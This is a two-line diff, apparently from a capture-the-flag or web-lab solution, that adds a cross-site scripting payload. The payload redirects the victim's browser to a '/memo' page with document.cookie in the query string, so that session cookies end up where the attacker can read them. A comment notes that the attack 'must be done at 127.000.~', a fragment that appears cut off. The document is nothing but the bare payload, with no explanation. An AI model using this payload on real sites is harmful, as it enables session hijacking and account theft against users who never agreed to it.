@@ -1,0 +1,2 @@
+<script>location='/memo?memo='+document.cookie</script> 
+#must be done at 127.000.~
